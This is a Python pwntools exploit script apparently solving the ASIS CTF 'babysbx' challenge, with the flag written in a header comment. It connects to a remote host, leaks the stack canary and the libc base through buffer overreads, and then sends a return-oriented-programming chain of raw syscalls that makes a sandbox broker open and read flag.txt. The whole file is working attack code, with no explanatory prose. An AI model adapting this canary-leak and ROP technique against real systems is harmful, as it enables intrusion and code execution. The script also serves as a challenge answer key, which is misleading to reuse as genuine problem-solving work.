# ASIS{SBXSBX_babyXXX_Sh3n4N}
from pwn import *

elf = ELF("./babysbx")
libc = elf.libc

def sla(s, d):
	target.sendlineafter(s, d)

def snd(data):
	sla(": ", "1")
	sla(": ", "-1")
	target.send(data)

def rcv():
	sla(": ", "2")

def leave():
	sla(": ", "3")

#target = elf.process()
target = remote("65.108.188.88", 31010)
#gdb.attach(target, 'b fopen')
#target = gdb.debug("./babysbx", 'set follow-fork-mode child')

snd("A"*0x109)
rcv()
target.recvuntil("A"*0x109)
canary = "\x00" + target.recv(7)
log.info("Canary: " + hex(u64(canary)))

snd("A"*0x128)
rcv()
target.recvuntil("A"*0x128)
libc_base = u64(target.recv(6) + "\x00"*2) - libc.sym['__libc_start_main'] - 243
log.info("LIBC Base: " + hex(libc_base))

pop_rax = p64(libc_base + 0x000000000004a550)
pop_rdi = p64(libc_base + 0x0000000000026b72)
pop_rsi = p64(libc_base + 0x0000000000027529)
set_rdx = p64(libc_base + 0x00000000000a2148)	# 0x00000000000a2148 : mov rdx, r12 ; pop r12 ; pop r13 ; ret
pop_r12 = p64(libc_base + 0x0000000000032b59)
sys_ret = p64(libc_base + 0x0000000000066229)
_buffer = libc_base + libc.sym['__malloc_hook']

def gen_sys(rax, rdi, rsi=_buffer):
	return pop_rax + p64(rax) + pop_rdi + p64(rdi) + pop_rsi + p64(rsi) + sys_ret

payload = "A"*0x108 + canary + "A"*0x8
payload += pop_r12 + p64(0xff) + set_rdx + p64(0)*2
payload += gen_sys(0, 0)
payload += gen_sys(1, 4, _buffer + 0x00)
payload += gen_sys(1, 4, _buffer + 0x10)
payload += gen_sys(1, 4, _buffer + 0x20)
payload += gen_sys(0, 5) + gen_sys(1, 1)
snd(payload + "\n")

leave()

cmds = p32(0) + "./flag.txt\x00"
cmds += "\x00"*(0x10 - len(cmds))
cmds += p32(1)*4
cmds += p32(2)*4
target.sendline(cmds)

target.interactive()